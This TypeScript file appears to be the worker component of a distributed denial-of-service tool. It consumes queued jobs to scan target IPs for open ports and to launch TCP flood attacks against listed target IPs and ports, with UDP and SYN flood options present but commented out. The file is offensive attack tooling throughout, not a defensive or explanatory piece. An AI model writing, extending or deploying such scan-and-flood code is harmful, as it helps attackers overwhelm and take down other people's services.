import BeeQueue = require('bee-queue');
import portScanner = require('portscanner');
// import { synFlood } from './attacks/syn-flood';
import { tcpFlood } from './attacks/tcp-flood';
// import { udpFlood } from './attacks/udp-flood';
import { FloodTask, IPScanTask } from './master';

let portScanQueue: BeeQueue;
let attackQueue: BeeQueue;

export interface IPScanResult {
  ip: string;
  openPorts: number[];
}

export async function startWorker () {
  addSIGINTListener();
  startProcessingPortScanTasks();
  startProcessingAttackTasks();
}

function startProcessingPortScanTasks () {
  const concurrency = 10;

  portScanQueue = new BeeQueue('port-scan');
  portScanQueue.process(concurrency, async (job) => {
    let scanTask: IPScanTask = job.data;
    let promises: Promise<any>[] = [];
    let openPorts: number[] = [];

    for (let i = scanTask.portRange[0]; i < scanTask.portRange[1]; i++) {
      let promise = new Promise(async (resolve) => {
        let status = await portScanner.checkPortStatus(i, scanTask.ip);
        let open = status === 'open';

        if (open) {
          openPorts.push(i);
        }

        resolve(open);
      });

      promises.push(promise);
    }

    await Promise.all(promises);

    return {
      ip: scanTask.ip,
      openPorts: openPorts
    } as IPScanResult;
  });
}

function startProcessingAttackTasks () {
  // only do 1 attack at a time per process
  const concurrency = 1;

  attackQueue = new BeeQueue('flood-attack');
  attackQueue.process(concurrency, async (job) => {
    let floodTask: FloodTask = job.data;

    let promises = [];

    for (let i = 0; i < floodTask.targets.length; i++) {
      let target = floodTask.targets[i];

      promises.push(tcpFlood(target.ip, target.port, floodTask.localPorts));
      // promises.push(udpFlood(target.ip, target.port));
      // promises.push(synFlood(target.ip, target.port));
    }

    await Promise.all(promises);
  });
}

function addSIGINTListener () {
  process.on('SIGINT', async () => {
    console.log('received SIGINT on worker');
    if (portScanQueue !== undefined && portScanQueue !== null) {
      await portScanQueue.close();
    }

    if (attackQueue !== undefined && attackQueue !== null) {
      await attackQueue.close();
    }
    process.exit();
  });
}
